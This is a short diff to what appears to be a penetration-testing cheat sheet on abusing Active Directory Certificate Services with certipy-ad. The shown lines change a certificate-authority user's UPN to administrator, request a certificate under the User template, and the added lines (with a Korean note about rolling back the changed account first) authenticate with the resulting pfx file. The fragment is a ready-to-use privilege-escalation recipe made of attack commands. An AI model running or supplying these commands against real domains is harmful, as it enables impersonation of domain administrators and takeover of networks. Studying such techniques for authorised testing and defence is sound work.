@@ -194,4 +194,7 @@ certipy-ad account -u <user> -hashes <hashes> -user <CA user> -upn administrator
 certipy-ad account -u <user> -hashes <hashes> -user <CA user> read
 
 certipy-ad req -u <CA user> -hashes <hash> -dc-ip <ip> -target <FQDN> -ca <CA Authority name> -template User
+
+# 사용하기 전에 update 된 CA를 롤백 해줘야할수도 있음.
+certipy-ad auth -dc-ip <ip> -pfx <pfx file> -u <user> -domain <domain>
 ```
